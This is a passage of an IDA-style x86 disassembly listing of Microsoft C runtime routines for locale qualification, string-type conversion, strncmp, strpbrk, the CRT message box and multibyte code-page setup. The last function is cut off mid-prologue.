; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


sub_10098B1	proc near		; CODE XREF: ___get_qualified_locale+DDp
		mov	eax, Str1
		lea	edx, [eax+1]

loc_10098B9:				; CODE XREF: sub_10098B1+Dj
		mov	cl, [eax]
		inc	eax
		test	cl, cl
		jnz	short loc_10098B9
		xor	ecx, ecx
		sub	eax, edx
		cmp	eax, 3
		setz	cl
		push	1		; dwFlags
		push	offset LocaleEnumProc ;	lpLocaleEnumProc
		mov	dword_1010730, ecx
		call	ds:__imp__EnumSystemLocalesA@8 ; EnumSystemLocalesA(x,x)
		test	byte ptr dword_1010720,	4
		jnz	short locret_10098ED
		and	dword_1010720, 0

locret_10098ED:				; CODE XREF: sub_10098B1+33j
		retn
sub_10098B1	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


sub_10098F3	proc near		; CODE XREF: ___get_qualified_locale+8Cp
					; ___get_qualified_locale+C6p
		mov	edi, edi
		push	ebx
		push	esi
		push	edi
		mov	edi, dword_101073C
		mov	eax, edi
		lea	esi, [eax+1]

loc_1009903:				; CODE XREF: sub_10098F3+15j
		mov	cl, [eax]
		inc	eax
		test	cl, cl
		jnz	short loc_1009903
		sub	eax, esi
		xor	ecx, ecx
		cmp	eax, 3
		mov	eax, Str1
		setz	cl
		lea	esi, [eax+1]
		mov	dword_101072C, ecx

loc_1009922:				; CODE XREF: sub_10098F3+34j
		mov	bl, [eax]
		inc	eax
		test	bl, bl
		jnz	short loc_1009922
		xor	edx, edx
		sub	eax, esi
		cmp	eax, 3
		setz	dl
		and	Locale,	0
		test	ecx, ecx
		mov	dword_1010730, edx
		jz	short loc_1009950
		mov	MaxCount, 2
		jmp	short loc_100995C
; ---------------------------------------------------------------------------

loc_1009950:				; CODE XREF: sub_10098F3+4Fj
		mov	edx, edi
		call	_GetPrimaryLen
		mov	MaxCount, eax

loc_100995C:				; CODE XREF: sub_10098F3+5Bj
		push	1		; dwFlags
		push	offset sub_100959B ; lpLocaleEnumProc
		call	ds:__imp__EnumSystemLocalesA@8 ; EnumSystemLocalesA(x,x)
		mov	eax, dword_1010720
		test	ah, 1
		pop	edi
		pop	esi
		pop	ebx
		jz	short loc_100997F
		test	ah, 2
		jz	short loc_100997F
		test	al, 7
		jnz	short locret_1009986

loc_100997F:				; CODE XREF: sub_10098F3+81j
					; sub_10098F3+86j
		and	dword_1010720, 0

locret_1009986:				; CODE XREF: sub_10098F3+8Aj
		retn
sub_10098F3	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


sub_100998C	proc near		; CODE XREF: ___get_qualified_locale:loc_1009A81p
					; ___get_qualified_locale:loc_1009ABBp
		mov	edx, dword_101073C
		mov	eax, edx
		push	esi
		lea	esi, [eax+1]

loc_1009998:				; CODE XREF: sub_100998C+11j
		mov	cl, [eax]
		inc	eax
		test	cl, cl
		jnz	short loc_1009998
		sub	eax, esi
		xor	ecx, ecx
		cmp	eax, 3
		setz	cl
		pop	esi
		mov	eax, ecx
		test	eax, eax
		mov	dword_101072C, eax
		jz	short loc_10099C1
		mov	MaxCount, 2
		jmp	short loc_10099CB
; ---------------------------------------------------------------------------

loc_10099C1:				; CODE XREF: sub_100998C+27j
		call	_GetPrimaryLen
		mov	MaxCount, eax

loc_10099CB:				; CODE XREF: sub_100998C+33j
		push	1		; dwFlags
		push	offset sub_10097DF ; lpLocaleEnumProc
		call	ds:__imp__EnumSystemLocalesA@8 ; EnumSystemLocalesA(x,x)
		test	byte ptr dword_1010720,	4
		jnz	short locret_10099E8
		and	dword_1010720, 0

locret_10099E8:				; CODE XREF: sub_100998C+53j
		retn
sub_100998C	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl __get_qualified_locale(int Value,	int, int)
___get_qualified_locale	proc near	; CODE XREF: __expandlocale+102p

Value		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		push	edi
		xor	edi, edi
		cmp	dword_1010740, edi
		jnz	short loc_1009A1F
		cmp	__osplatform, 2
		jnz	short loc_1009A15
		mov	eax, ds:__imp__GetLocaleInfoA@16 ; GetLocaleInfoA(x,x,x,x)
		mov	dword_1010740, eax
		jmp	short loc_1009A1F
; ---------------------------------------------------------------------------

loc_1009A15:				; CODE XREF: ___get_qualified_locale+19j
		mov	dword_1010740, offset sub_1009340

loc_1009A1F:				; CODE XREF: ___get_qualified_locale+10j
					; ___get_qualified_locale+25j
		mov	esi, [ebp+Value]
		cmp	esi, edi
		jz	loc_1009AD2
		lea	eax, [esi+40h]
		cmp	eax, edi
		mov	ecx, esi
		mov	dword_101073C, ecx
		mov	Str1, eax
		jz	short loc_1009A62
		cmp	byte ptr [eax],	0
		jz	short loc_1009A62
		push	offset Str1
		push	16h
		push	offset ___rg_country
		call	_TranslateName
		mov	ecx, dword_101073C
		mov	eax, Str1
		add	esp, 0Ch

loc_1009A62:				; CODE XREF: ___get_qualified_locale+4Ej
					; ___get_qualified_locale+53j
		cmp	ecx, edi
		mov	dword_1010720, edi
		jz	short loc_1009AC2
		cmp	byte ptr [ecx],	0
		jz	short loc_1009AC2
		cmp	eax, edi
		jz	short loc_1009A81
		cmp	byte ptr [eax],	0
		jz	short loc_1009A81
		call	sub_10098F3
		jmp	short loc_1009A86
; ---------------------------------------------------------------------------

loc_1009A81:				; CODE XREF: ___get_qualified_locale+85j
					; ___get_qualified_locale+8Aj
		call	sub_100998C

loc_1009A86:				; CODE XREF: ___get_qualified_locale+91j
		cmp	dword_1010720, edi
		jnz	short loc_1009AE3
		push	offset dword_101073C
		push	40h
		push	offset ___rg_language
		call	_TranslateName
		add	esp, 0Ch
		test	eax, eax
		jz	short loc_1009AD7
		mov	eax, Str1
		cmp	eax, edi
		jz	short loc_1009ABB
		cmp	byte ptr [eax],	0
		jz	short loc_1009ABB
		call	sub_10098F3
		jmp	short loc_1009AD7
; ---------------------------------------------------------------------------

loc_1009ABB:				; CODE XREF: ___get_qualified_locale+BFj
					; ___get_qualified_locale+C4j
		call	sub_100998C
		jmp	short loc_1009AD7
; ---------------------------------------------------------------------------

loc_1009AC2:				; CODE XREF: ___get_qualified_locale+7Cj
					; ___get_qualified_locale+81j
		cmp	eax, edi
		jz	short loc_1009AD2
		cmp	byte ptr [eax],	0
		jz	short loc_1009AD2
		call	sub_10098B1
		jmp	short loc_1009AD7
; ---------------------------------------------------------------------------

loc_1009AD2:				; CODE XREF: ___get_qualified_locale+36j
					; ___get_qualified_locale+D6j ...
		call	_GetLcidFromDefault

loc_1009AD7:				; CODE XREF: ___get_qualified_locale+B6j
					; ___get_qualified_locale+CBj ...
		cmp	dword_1010720, edi
		jz	loc_1009BA9

loc_1009AE3:				; CODE XREF: ___get_qualified_locale+9Ej
		add	esi, 80h
		push	esi		; Str
		call	sub_1009299
		mov	esi, eax
		cmp	esi, edi
		pop	ecx
		mov	[ebp+Value], esi
		jz	loc_1009BA9
		movzx	eax, si
		push	eax		; CodePage
		call	ds:__imp__IsValidCodePage@4 ; IsValidCodePage(x)
		test	eax, eax
		jz	loc_1009BA9
		push	1		; dwFlags
		push	Locale		; Locale
		call	ds:__imp__IsValidLocale@8 ; IsValidLocale(x,x)
		test	eax, eax
		jz	loc_1009BA9
		mov	eax, [ebp+arg_4]
		cmp	eax, edi
		mov	ecx, Locale
		jz	short loc_1009B44
		mov	dx, word ptr dword_1010728
		mov	[eax], cx
		mov	[eax+2], dx
		mov	[eax+4], si

loc_1009B44:				; CODE XREF: ___get_qualified_locale+142j
		mov	ebx, [ebp+arg_8]
		cmp	ebx, edi
		jz	short loc_1009BA4
		cmp	word ptr [eax],	814h
		jnz	short loc_1009B64
		mov	esi, offset aNorwegianNynor ; "Norwegian-Nynorsk"
		mov	edi, ebx
		movsd
		movsd
		movsd
		movsd
		movsw
		mov	esi, [ebp+Value]
		jmp	short loc_1009B77
; ---------------------------------------------------------------------------

loc_1009B64:				; CODE XREF: ___get_qualified_locale+162j
		push	40h
		push	ebx
		push	1001h
		push	ecx
		call	dword_1010740
		test	eax, eax
		jz	short loc_1009BA9

loc_1009B77:				; CODE XREF: ___get_qualified_locale+174j
		push	40h
		lea	eax, [ebx+40h]
		push	eax
		push	1002h
		push	dword_1010728
		call	dword_1010740
		test	eax, eax
		jz	short loc_1009BA9
		push	0Ah		; Radix
		add	ebx, 80h
		push	ebx		; Dest
		push	esi		; Value
		call	__itoa
		add	esp, 0Ch

loc_1009BA4:				; CODE XREF: ___get_qualified_locale+15Bj
		xor	eax, eax
		inc	eax
		jmp	short loc_1009BAB
; ---------------------------------------------------------------------------

loc_1009BA9:				; CODE XREF: ___get_qualified_locale+EFj
					; ___get_qualified_locale+109j	...
		xor	eax, eax

loc_1009BAB:				; CODE XREF: ___get_qualified_locale+1B9j
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn
___get_qualified_locale	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl __crtGetStringTypeA(DWORD	dwInfoType, LPCSTR lpMultiByteStr, int cchSrc, LPWORD lpCharType, UINT CodePage, LCID Locale, int)
___crtGetStringTypeA proc near		; CODE XREF: sub_1006C05+1C3p
					; __isctype+69p ...

var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
CharType	= word ptr -1Ch
ms_exc		= CPPEH_RECORD ptr -18h
dwInfoType	= dword	ptr  8
lpMultiByteStr	= dword	ptr  0Ch
cchSrc		= dword	ptr  10h
lpCharType	= dword	ptr  14h
CodePage	= dword	ptr  18h
Locale		= dword	ptr  1Ch
arg_18		= dword	ptr  20h

		push	1Ch
		push	offset stru_10035C0
		call	__SEH_prolog
		xor	esi, esi
		cmp	dword_1010744, esi
		jnz	short loc_1009C00
		lea	eax, [ebp+CharType]
		push	eax		; lpCharType
		xor	edi, edi
		inc	edi
		push	edi		; cchSrc
		push	offset SrcStr	; lpSrcStr
		push	edi		; dwInfoType
		call	ds:__imp__GetStringTypeW@16 ; GetStringTypeW(x,x,x,x)
		test	eax, eax
		jz	short loc_1009BEB
		mov	dword_1010744, edi
		jmp	short loc_1009C00
; ---------------------------------------------------------------------------

loc_1009BEB:				; CODE XREF: ___crtGetStringTypeA+2Cj
		call	ds:__imp__GetLastError@0 ; GetLastError()
		cmp	eax, 78h
		jnz	short loc_1009C00
		mov	dword_1010744, 2

loc_1009C00:				; CODE XREF: ___crtGetStringTypeA+14j
					; ___crtGetStringTypeA+34j ...
		mov	eax, dword_1010744
		cmp	eax, 2
		jz	loc_1009D00
		cmp	eax, esi
		jz	loc_1009D00
		cmp	eax, 1
		jnz	loc_1009D26
		mov	[ebp+var_24], esi
		mov	[ebp+var_20], esi
		cmp	[ebp+CodePage],	esi
		jnz	short loc_1009C32
		mov	eax, ___lc_codepage
		mov	[ebp+CodePage],	eax

loc_1009C32:				; CODE XREF: ___crtGetStringTypeA+73j
		push	esi		; cchWideChar
		push	esi		; lpWideCharStr
		push	[ebp+cchSrc]	; cbMultiByte
		push	[ebp+lpMultiByteStr] ; lpMultiByteStr
		xor	eax, eax
		cmp	[ebp+arg_18], esi
		setnz	al
		lea	eax, ds:1[eax*8]
		push	eax		; dwFlags
		push	[ebp+CodePage]	; CodePage
		call	ds:__imp__MultiByteToWideChar@24 ; MultiByteToWideChar(x,x,x,x,x,x)
		mov	ebx, eax
		mov	[ebp+var_28], ebx
		test	ebx, ebx
		jz	loc_1009D26
		and	[ebp+ms_exc.disabled], 0
		lea	edi, [ebx+ebx]
		mov	eax, edi
		add	eax, 3
		and	eax, 0FFFFFFFCh
		call	__chkstk
		mov	[ebp+ms_exc.old_esp], esp
		mov	esi, esp
		mov	[ebp+var_2C], esi
		mov	ecx, edi
		xor	eax, eax
		mov	edi, esi
		mov	edx, ecx
		shr	ecx, 2
		rep stosd
		mov	ecx, edx
		and	ecx, 3
		rep stosb
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		jmp	short loc_1009CAB
; ---------------------------------------------------------------------------

loc_1009C96:				; DATA XREF: .text:stru_10035C0o
		xor	eax, eax	; Exception filter 0 for function 1009BB5
		inc	eax
		retn
; ---------------------------------------------------------------------------

loc_1009C9A:				; DATA XREF: .text:stru_10035C0o
		mov	esp, [ebp+ms_exc.old_esp] ; Exception handler 0	for function 1009BB5
		call	__resetstkoflw
		xor	esi, esi
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		mov	ebx, [ebp+var_28]

loc_1009CAB:				; CODE XREF: ___crtGetStringTypeA+DFj
		test	esi, esi
		jnz	short loc_1009CC6
		push	ebx		; SizeOfElements
		push	2		; NumOfElements
		call	_calloc
		pop	ecx
		pop	ecx
		mov	esi, eax
		test	esi, esi
		jz	short loc_1009D26
		mov	[ebp+var_20], 1

loc_1009CC6:				; CODE XREF: ___crtGetStringTypeA+F8j
		push	ebx		; cchWideChar
		push	esi		; lpWideCharStr
		push	[ebp+cchSrc]	; cbMultiByte
		push	[ebp+lpMultiByteStr] ; lpMultiByteStr
		push	1		; dwFlags
		push	[ebp+CodePage]	; CodePage
		call	ds:__imp__MultiByteToWideChar@24 ; MultiByteToWideChar(x,x,x,x,x,x)
		test	eax, eax
		jz	short loc_1009CEE
		push	[ebp+lpCharType] ; lpCharType
		push	eax		; cchSrc
		push	esi		; lpSrcStr
		push	[ebp+dwInfoType] ; dwInfoType
		call	ds:__imp__GetStringTypeW@16 ; GetStringTypeW(x,x,x,x)
		mov	[ebp+var_24], eax

loc_1009CEE:				; CODE XREF: ___crtGetStringTypeA+126j
		cmp	[ebp+var_20], 0
		jz	short loc_1009CFB
		push	esi		; Memory
		call	_free
		pop	ecx

loc_1009CFB:				; CODE XREF: ___crtGetStringTypeA+13Dj
		mov	eax, [ebp+var_24]
		jmp	short loc_1009D6E
; ---------------------------------------------------------------------------

loc_1009D00:				; CODE XREF: ___crtGetStringTypeA+53j
					; ___crtGetStringTypeA+5Bj
		mov	edi, [ebp+Locale]
		cmp	edi, esi
		jnz	short loc_1009D0D
		mov	edi, dword_10106FC

loc_1009D0D:				; CODE XREF: ___crtGetStringTypeA+150j
		mov	ebx, [ebp+CodePage]
		test	ebx, ebx
		jnz	short loc_1009D1A
		mov	ebx, ___lc_codepage

loc_1009D1A:				; CODE XREF: ___crtGetStringTypeA+15Dj
		push	edi		; Locale
		call	___ansicp
		pop	ecx
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_1009D2A

loc_1009D26:				; CODE XREF: ___crtGetStringTypeA+64j
					; ___crtGetStringTypeA+A5j ...
		xor	eax, eax
		jmp	short loc_1009D6E
; ---------------------------------------------------------------------------

loc_1009D2A:				; CODE XREF: ___crtGetStringTypeA+16Fj
		cmp	eax, ebx
		jz	short loc_1009D4C
		push	0		; int
		push	0		; int
		lea	ecx, [ebp+cchSrc]
		push	ecx		; int
		push	[ebp+lpMultiByteStr] ; lpMultiByteStr
		push	eax		; int
		push	ebx		; CodePage
		call	___convertcp
		add	esp, 18h
		mov	esi, eax
		test	esi, esi
		jz	short loc_1009D26
		mov	[ebp+lpMultiByteStr], esi

loc_1009D4C:				; CODE XREF: ___crtGetStringTypeA+177j
		push	[ebp+lpCharType] ; lpCharType
		push	[ebp+cchSrc]	; cchSrc
		push	[ebp+lpMultiByteStr] ; lpSrcStr
		push	[ebp+dwInfoType] ; dwInfoType
		push	edi		; Locale
		call	ds:__imp__GetStringTypeA@20 ; GetStringTypeA(x,x,x,x,x)
		mov	ebx, eax
		test	esi, esi
		jz	short loc_1009D6C
		push	esi		; Memory
		call	_free
		pop	ecx

loc_1009D6C:				; CODE XREF: ___crtGetStringTypeA+1AEj
		mov	eax, ebx

loc_1009D6E:				; CODE XREF: ___crtGetStringTypeA+149j
					; ___crtGetStringTypeA+173j
		lea	esp, [ebp-38h]
		call	__SEH_epilog
		retn
___crtGetStringTypeA endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl strncmp(const char *Str1,	const char *Str2, size_t MaxCount)
_strncmp	proc near		; CODE XREF: _setlocale+D4p

Str1		= dword	ptr  8
Str2		= dword	ptr  0Ch
MaxCount	= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	edi
		push	esi
		push	ebx
		mov	ecx, [ebp+MaxCount]
		jecxz	short loc_1009DB1
		mov	ebx, ecx
		mov	edi, [ebp+Str1]
		mov	esi, edi
		xor	eax, eax
		repne scasb
		neg	ecx
		add	ecx, ebx
		mov	edi, esi
		mov	esi, [ebp+Str2]
		repe cmpsb
		mov	al, [esi-1]
		xor	ecx, ecx
		cmp	al, [edi-1]
		ja	short loc_1009DAF
		jz	short loc_1009DB1
		dec	ecx
		dec	ecx

loc_1009DAF:				; CODE XREF: _strncmp+29j
		not	ecx

loc_1009DB1:				; CODE XREF: _strncmp+9j _strncmp+2Bj
		mov	eax, ecx
		pop	ebx
		pop	esi
		pop	edi
		leave
		retn
_strncmp	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; char *__cdecl	strpbrk(const char *Str, const char *Control)
_strpbrk	proc near		; CODE XREF: _setlocale+91p

var_24		= dword	ptr -24h
Str		= dword	ptr  8
Control		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	esi
		xor	eax, eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		mov	edx, [ebp+Control]
		lea	ecx, [ecx+0]

loc_1009DD4:				; CODE XREF: _strpbrk+1Fj
		mov	al, [edx]
		or	al, al
		jz	short loc_1009DE1
		inc	edx
		bts	[esp+24h+var_24], eax
		jmp	short loc_1009DD4
; ---------------------------------------------------------------------------

loc_1009DE1:				; CODE XREF: _strpbrk+18j
		mov	esi, [ebp+Str]

loc_1009DE4:				; CODE XREF: _strpbrk+2Fj
		mov	al, [esi]
		or	al, al
		jz	short loc_1009DF4
		inc	esi
		bt	[esp+24h+var_24], eax
		jnb	short loc_1009DE4
		lea	eax, [esi-1]

loc_1009DF4:				; CODE XREF: _strpbrk+28j
		add	esp, 20h
		pop	esi
		leave
		retn
_strpbrk	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

___crtMessageBoxA proc near		; CODE XREF: __NMSG_WRITE+199p

var_10		= byte ptr -10h
var_8		= byte ptr -8
var_4		= byte ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_A		= byte ptr  12h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		xor	ebx, ebx
		cmp	dword_101076C, ebx
		push	esi
		push	edi
		jnz	short loc_1009E81
		push	offset aUser32_dll_0 ; "user32.dll"
		call	ds:__imp__LoadLibraryA@4 ; LoadLibraryA(x)
		mov	edi, eax
		cmp	edi, ebx
		jz	loc_1009EBC
		mov	esi, ds:__imp__GetProcAddress@8	; GetProcAddress(x,x)
		push	offset aMessageboxa ; "MessageBoxA"
		push	edi		; hModule
		call	esi ; GetProcAddress(x,x) ; GetProcAddress(x,x)
		test	eax, eax
		mov	dword_101076C, eax
		jz	short loc_1009EBC
		push	offset aGetactivewindo ; "GetActiveWindow"
		push	edi		; hModule
		call	esi ; GetProcAddress(x,x) ; GetProcAddress(x,x)
		push	offset aGetlastactivep ; "GetLastActivePopup"
		push	edi		; hModule
		mov	dword_1010770, eax
		call	esi ; GetProcAddress(x,x) ; GetProcAddress(x,x)
		cmp	__osplatform, 2
		mov	dword_1010774, eax
		jnz	short loc_1009E81
		push	offset aGetuserobjecti ; "GetUserObjectInformationA"
		push	edi		; hModule
		call	esi ; GetProcAddress(x,x) ; GetProcAddress(x,x)
		test	eax, eax
		mov	dword_101077C, eax
		jz	short loc_1009E81
		push	offset aGetprocesswind ; "GetProcessWindowStation"
		push	edi		; hModule
		call	esi ; GetProcAddress(x,x) ; GetProcAddress(x,x)
		mov	dword_1010778, eax

loc_1009E81:				; CODE XREF: ___crtMessageBoxA+13j
					; ___crtMessageBoxA+62j ...
		mov	eax, dword_1010778
		test	eax, eax
		jz	short loc_1009EC6
		call	eax ; dword_1010778
		test	eax, eax
		jz	short loc_1009EAD
		lea	ecx, [ebp+var_4]
		push	ecx
		push	0Ch
		lea	ecx, [ebp+var_10]
		push	ecx
		push	1
		push	eax
		call	dword_101077C
		test	eax, eax
		jz	short loc_1009EAD
		test	[ebp+var_8], 1
		jnz	short loc_1009EC6

loc_1009EAD:				; CODE XREF: ___crtMessageBoxA+8Fj
					; ___crtMessageBoxA+A6j
		cmp	__winmajor, 4
		jb	short loc_1009EC0
		or	[ebp+arg_A], 20h
		jmp	short loc_1009EE5
; ---------------------------------------------------------------------------

loc_1009EBC:				; CODE XREF: ___crtMessageBoxA+24j
					; ___crtMessageBoxA+3Fj
		xor	eax, eax
		jmp	short loc_1009EF5
; ---------------------------------------------------------------------------

loc_1009EC0:				; CODE XREF: ___crtMessageBoxA+B5j
		or	[ebp+arg_A], 4
		jmp	short loc_1009EE5
; ---------------------------------------------------------------------------

loc_1009EC6:				; CODE XREF: ___crtMessageBoxA+89j
					; ___crtMessageBoxA+ACj
		mov	eax, dword_1010770
		test	eax, eax
		jz	short loc_1009EE5
		call	eax ; dword_1010770
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_1009EE5
		mov	eax, dword_1010774
		test	eax, eax
		jz	short loc_1009EE5
		push	ebx
		call	eax ; dword_1010774
		mov	ebx, eax

loc_1009EE5:				; CODE XREF: ___crtMessageBoxA+BBj
					; ___crtMessageBoxA+C5j ...
		push	dword ptr [ebp+10h]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		push	ebx
		call	dword_101076C

loc_1009EF5:				; CODE XREF: ___crtMessageBoxA+BFj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
___crtMessageBoxA endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1009EFF	proc near		; CODE XREF: __ismbblead+Cp

arg_0		= byte ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= byte ptr  10h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		movzx	eax, [ebp+arg_0]
		mov	cl, [ebp+arg_8]
		test	byte_1011901[eax], cl
		jnz	short loc_1009F2E
		cmp	[ebp+arg_4], 0
		jz	short loc_1009F26
		movzx	eax, ds:word_100239A[eax*2]
		and	eax, [ebp+arg_4]
		jmp	short loc_1009F28
; ---------------------------------------------------------------------------

loc_1009F26:				; CODE XREF: sub_1009EFF+18j
		xor	eax, eax

loc_1009F28:				; CODE XREF: sub_1009EFF+25j
		test	eax, eax
		jnz	short loc_1009F2E
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_1009F2E:				; CODE XREF: sub_1009EFF+12j
					; sub_1009EFF+2Bj
		xor	eax, eax
		inc	eax
		pop	ebp
		retn
sub_1009EFF	endp

; ---------------------------------------------------------------------------
		align 8

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl _ismbblead(unsigned int)
__ismbblead	proc near		; CODE XREF: __wincmdln+35p

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	4
		push	0
		push	[ebp+arg_0]
		call	sub_1009EFF
		add	esp, 0Ch
		pop	ebp
		retn
__ismbblead	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)
; [0000002F BYTES: COLLAPSED FUNCTION _CPtoLCID. PRESS KEYPAD "+" TO EXPAND]
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


sub_1009F87	proc near		; CODE XREF: __setmbcp:loc_100A31Dp
		mov	edi, edi
		push	edi
		push	40h
		xor	eax, eax
		pop	ecx
		mov	edi, offset __mbctype
		rep stosd
		stosb
		xor	eax, eax
		mov	___mbcodepage, eax
		mov	___ismbcodepage, eax
		mov	___mblcid, eax
		mov	edi, offset ___mbulinfo
		stosd
		stosd
		stosd
		pop	edi
		retn
sub_1009F87	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1009FB7	proc near		; CODE XREF: __setmbcp:loc_100A322p

CPInfo		= _cpinfo ptr -518h
CharType	= word ptr -504h
var_304		= byte ptr -304h
DestStr		= word ptr -204h
MultiByteStr	= byte ptr -104h
var_4		= dword	ptr -4

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 518h
		mov	eax, ___security_cookie
		mov	[ebp+var_4], eax
		push	esi
		lea	eax, [ebp+CPInfo]
		push	eax		; lpCPInfo
		push	___mbcodepage	; CodePage
		call	ds:__imp__GetCPInfo@8 ;	GetCPInfo(x,x)
		cmp	eax, 1
		mov	esi, 100h
		jnz	loc_100A0FF
		xor	eax, eax

loc_1009FEE:				; CODE XREF: sub_1009FB7+41j
		mov	[ebp+eax+MultiByteStr],	al
		inc	eax
		cmp	eax, esi
		jb	short loc_1009FEE
		mov	al, [ebp+CPInfo.LeadByte]
		test	al, al
		mov	[ebp+MultiByteStr], 20h
		jz	short loc_100A044
		push	ebx
		lea	edx, [ebp+CPInfo.LeadByte+1]
		push	edi

loc_100A013:				; CODE XREF: sub_1009FB7+89j
		movzx	ecx, byte ptr [edx]
		movzx	eax, al
		cmp	eax, ecx
		ja	short loc_100A03A
		sub	ecx, eax
		inc	ecx
		mov	ebx, ecx
		shr	ecx, 2
		lea	edi, [ebp+eax+MultiByteStr]
		mov	eax, 20202020h
		rep stosd
		mov	ecx, ebx
		and	ecx, 3
		rep stosb

loc_100A03A:				; CODE XREF: sub_1009FB7+64j
		inc	edx
		mov	al, [edx]
		inc	edx
		test	al, al
		jnz	short loc_100A013
		pop	edi
		pop	ebx

loc_100A044:				; CODE XREF: sub_1009FB7+52j
		push	0		; int
		push	___mblcid	; Locale
		lea	eax, [ebp+CharType]
		push	___mbcodepage	; CodePage
		push	eax		; lpCharType
		push	esi		; cchSrc
		lea	eax, [ebp+MultiByteStr]
		push	eax		; lpMultiByteStr
		push	1		; dwInfoType
		call	___crtGetStringTypeA
		push	0		; int
		push	___mbcodepage	; CodePage
		lea	eax, [ebp+DestStr]
		push	esi		; cchDest
		push	eax		; lpDestStr
		push	esi		; cchSrc
		lea	eax, [ebp+MultiByteStr]
		push	eax		; lpMultiByteStr
		push	esi		; dwMapFlags
		push	___mblcid	; Locale
		call	___crtLCMapStringA
		push	0		; int
		push	___mbcodepage	; CodePage
		lea	eax, [ebp+var_304]
		push	esi		; cchDest
		push	eax		; lpDestStr
		push	esi		; cchSrc
		lea	eax, [ebp+MultiByteStr]
		push	eax		; lpMultiByteStr
		push	200h		; dwMapFlags
		push	___mblcid	; Locale
		call	___crtLCMapStringA
		add	esp, 5Ch
		xor	eax, eax

loc_100A0B9:				; CODE XREF: sub_1009FB7+144j
		mov	cx, [ebp+eax*2+CharType]
		test	cl, 1
		jz	short loc_100A0DC
		or	byte_1011901[eax], 10h
		mov	cl, byte ptr [ebp+eax+DestStr]

loc_100A0D4:				; CODE XREF: sub_1009FB7+138j
		mov	__mbcasemap[eax], cl
		jmp	short loc_100A0F8
; ---------------------------------------------------------------------------

loc_100A0DC:				; CODE XREF: sub_1009FB7+10Dj
		test	cl, 2
		jz	short loc_100A0F1
		or	byte_1011901[eax], 20h
		mov	cl, [ebp+eax+var_304]
		jmp	short loc_100A0D4
; ---------------------------------------------------------------------------

loc_100A0F1:				; CODE XREF: sub_1009FB7+128j
		mov	__mbcasemap[eax], 0

loc_100A0F8:				; CODE XREF: sub_1009FB7+123j
		inc	eax
		cmp	eax, esi
		jb	short loc_100A0B9
		jmp	short loc_100A143
; ---------------------------------------------------------------------------

loc_100A0FF:				; CODE XREF: sub_1009FB7+2Fj
		xor	eax, eax

loc_100A101:				; CODE XREF: sub_1009FB7+18Aj
		cmp	eax, 41h
		jb	short loc_100A11F
		cmp	eax, 5Ah
		ja	short loc_100A11F
		or	byte_1011901[eax], 10h
		mov	cl, al
		add	cl, 20h

loc_100A117:				; CODE XREF: sub_1009FB7+17Ej
		mov	__mbcasemap[eax], cl
		jmp	short loc_100A13E
; ---------------------------------------------------------------------------

loc_100A11F:				; CODE XREF: sub_1009FB7+14Dj
					; sub_1009FB7+152j
		cmp	eax, 61h
		jb	short loc_100A137
		cmp	eax, 7Ah
		ja	short loc_100A137
		or	byte_1011901[eax], 20h
		mov	cl, al
		sub	cl, 20h
		jmp	short loc_100A117
; ---------------------------------------------------------------------------

loc_100A137:				; CODE XREF: sub_1009FB7+16Bj
					; sub_1009FB7+170j
		mov	__mbcasemap[eax], 0

loc_100A13E:				; CODE XREF: sub_1009FB7+166j
		inc	eax
		cmp	eax, esi
		jb	short loc_100A101

loc_100A143:				; CODE XREF: sub_1009FB7+146j
		mov	ecx, [ebp+var_4]
		pop	esi
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		leave
		retn
sub_1009FB7	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl _setmbcp(int)
__setmbcp	proc near		; CODE XREF: ___initmbctable+Bp

var_1C		= dword	ptr -1Ch
CPInfo		= _cpinfo ptr -18h
var_4		= dword	ptr -4
CodePage	= dword	ptr  8

		mov	edi, edi
		push	ebp
